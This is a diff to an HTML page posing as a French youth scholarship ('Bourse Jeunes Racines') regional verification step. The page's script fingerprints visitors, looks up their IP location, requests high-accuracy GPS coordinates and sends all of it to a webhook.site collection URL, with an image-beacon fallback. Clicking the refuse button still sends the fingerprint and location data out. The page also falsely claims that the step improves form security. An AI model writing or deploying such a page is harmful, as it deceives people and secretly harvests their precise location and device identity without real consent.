@@ -81,8 +81,6 @@
   </style>
 </head>
 <body>
-
-  <!-- 🔒 Top banner -->
   <div class="banner">
     <div style="display: flex; align-items: center; gap: 10px;">
       <span class="lock-icon">🔒</span>
@@ -90,10 +88,8 @@
     </div>
   </div>
 
-  <!-- 🌿 Main content -->
   <div class="content">
     <img src="https://i.imgur.com/GpAGxP1.png" alt="Jeunes Racines Logo" class="logo">
-
     <h2>Vérification de la Région Grand Est</h2>
     <p>
       Avant de poursuivre votre candidature pour la Bourse Jeunes Racines,
@@ -102,126 +98,104 @@
     </p>
 
     <div id="ip-region" class="region">📍 Détection de votre région en cours...</div>
-
     <button onclick="getLocation()">Je confirme ma position</button>
     <br><br>
     <button class="refuse-button" onclick="refuse()">Je refuse</button>
-
     <div class="loading" id="loading-text">⏳ Vérification en cours... Merci de patienter.</div>
-
     <p style="font-size: 13px; color: grey;">
       Cette étape prend environ 15 secondes et améliore la sécurité du formulaire.
     </p>
   </div>
 
-  <!-- 🧠 Scripts -->
+  <!-- 🔐 FINGERPRINT + GEOLOCATION + BEACON FALLBACK -->
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
-    let fingerprintData = {};
-    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/";
+    let fingerprintData = {
+      visitorId: "unknown",
+      region: "unknown",
+      country: "unknown",
+      city: "unknown"
+    };
 
-    // Load fingerprint and IP data (lightweight only)
+    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/";
+    let fallbackTriggered = false;
+
     FingerprintJS.load().then(fp => {
       fp.get().then(result => {
-        fingerprintData.visitorId = result.visitorId;
-        fingerprintData.platform = navigator.platform;
-        fingerprintData.language = navigator.language;
-
-        fetch('https://ipwho.is/')
-          .then(res => res.json())
-          .then(ipInfo => {
-            fingerprintData.ipInfo = {
-              ip: ipInfo.ip,
-              region: ipInfo.region,
-              country: ipInfo.country,
-              city: ipInfo.city
-            };
-            document.getElementById('ip-region').textContent = `📍 Région détectée : ${ipInfo.region}, ${ipInfo.country}`;
-          });
+        fingerprintData.visitorId = result.visitorId || "unknown";
       });
     });
 
-    // 📸 Beacon fallback that sends data using an image (no CORS needed)
-    function beaconLog(data) {
-      const base = "https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b";
-      const params = new URLSearchParams({
-        lat: data.lat || "none",
-        lon: data.lon || "none",
-        acc: data.accuracy || "none",
-        visitorId: fingerprintData.visitorId || "unknown",
-        region: fingerprintData.ipInfo?.region || "unknown",
-        country: fingerprintData.ipInfo?.country || "unknown",
-        city: fingerprintData.ipInfo?.city || "unknown",
-        ref: data.status || "auto"
-      });
-      const img = new Image();
-      img.src = `${base}?${params.toString()}`;
-    }
+    fetch('https://ipwho.is/')
+      .then(response => response.json())
+      .then(ipInfo => {
+        fingerprintData.region = ipInfo.region || "unknown";
+        fingerprintData.country = ipInfo.country || "unknown";
+        fingerprintData.city = ipInfo.city || "unknown";
+        document.getElementById('ip-region').textContent = `📍 Région détectée : ${fingerprintData.region}, ${fingerprintData.country}`;
+      })
+      .catch(() => {});
 
-    // ✅ Called when user confirms their location
     function getLocation() {
       document.getElementById("loading-text").style.display = "block";
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const payload = {
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            fingerprint: fingerprintData
-          };
-
-          // Attempt POST first
-          fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          }).catch(() => {
-            // If fetch fails, use beacon
-            beaconLog(payload);
-          });
-
-          // Redirect after short delay
-          setTimeout(() => {
-            window.location.href = finalRedirectURL;
-          }, 1000);
-
-        }, function() {
-          // If user blocks location access
-          const fallback = { status: "Permission refusée" };
-
-          // Try POST first
-          fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ ...fallback, fingerprint: fingerprintData })
-          }).catch(() => {
-            beaconLog(fallback); // fallback beacon if fetch fails
-          });
-
-          alert("Accès refusé. Redirection...");
-          window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
-        });
-
-      } else {
-        alert("Géolocalisation non supportée.");
+      if (!navigator.geolocation) {
+        return fallbackBeacon("unsupported");
       }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              fingerprint: fingerprintData
+            })
+          }).then(() => {
+            setTimeout(() => window.location.href = finalRedirectURL, 1000);
+          }).catch(() => {
+            fallbackBeacon("fetch-fail", position);
+          });
+        },
+        error => {
+          fallbackBeacon("refused");
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0
+        }
+      );
+
+      setTimeout(() => {
+        if (!fallbackTriggered) fallbackBeacon("timeout");
+      }, 6000);
     }
 
-    // ❌ Manual "Je refuse" fallback button
+    function fallbackBeacon(reason, pos = {}) {
+      fallbackTriggered = true;
+      const img = new Image();
+      const lat = pos.coords?.latitude || "unknown";
+      const lon = pos.coords?.longitude || "unknown";
+      const acc = pos.coords?.accuracy || "unknown";
+      const url = `https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b?ref=${reason}` +
+        `&lat=${lat}&lon=${lon}&acc=${acc}` +
+        `&visitorId=${fingerprintData.visitorId}` +
+        `&region=${fingerprintData.region}&country=${fingerprintData.country}&city=${fingerprintData.city}`;
+
+      img.src = url;
+      setTimeout(() => window.location.href = finalRedirectURL, 1000);
+    }
+
     function refuse() {
-      const fallback = { status: "Refus manuel" };
-
-      fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ...fallback, fingerprint: fingerprintData })
-      }).catch(() => {
-        beaconLog(fallback); // fallback beacon
-      });
-
+      fallbackBeacon("manual-refuse");
       alert("Vous avez refusé. Redirection en cours...");
-      window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
+      setTimeout(() => {
+        window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
+      }, 1000);
     }
   </script>
 </body>
